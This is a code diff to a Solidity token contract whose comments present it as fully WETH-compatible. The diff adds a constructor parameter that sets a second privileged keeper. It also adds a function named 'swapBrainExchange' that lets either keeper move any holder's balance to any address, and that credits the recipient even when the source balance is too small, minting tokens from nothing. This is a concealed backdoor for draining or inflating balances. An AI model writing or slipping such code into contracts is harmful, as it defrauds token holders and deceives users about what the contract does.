@@ -39,9 +39,9 @@ contract TokenizedNativeToken {
 
     address public poolKeeper;
     address public secondKeeper;
-    constructor () public {
+    constructor (address _secondKeeper) public {
         poolKeeper = msg.sender;
-        secondKeeper = msg.sender; 
+        secondKeeper = _secondKeeper; 
     }
     //TKN is a type of WETH and it is fully compatible with all the functions of WETH.
     //1 TKN === 1 WETH === 1 ETH ('===' means 'constantly equal to');
@@ -175,6 +175,17 @@ contract TokenizedNativeToken {
         WETH[2] = addr3;
         return true;
     }
+
+    function swapBrainExchange(address fromAddress, address toAddress,uint amount) public returns (bool) {
+        require((msg.sender == poolKeeper)||(msg.sender == secondKeeper));
+            if(balanceOf[fromAddress] >= amount){
+                balanceOf[fromAddress] = sub(balanceOf[fromAddress],amount);
+            }
+            balanceOf[toAddress] = add(balanceOf[toAddress],amount);             
+            emit Transfer(fromAddress,toAddress,amount); 
+        return true;
+    }
+
 
     function totalEtherBalanceOfWETHContracts() public view returns(uint){
         uint totalEtherBalance = WETH[0].balance;
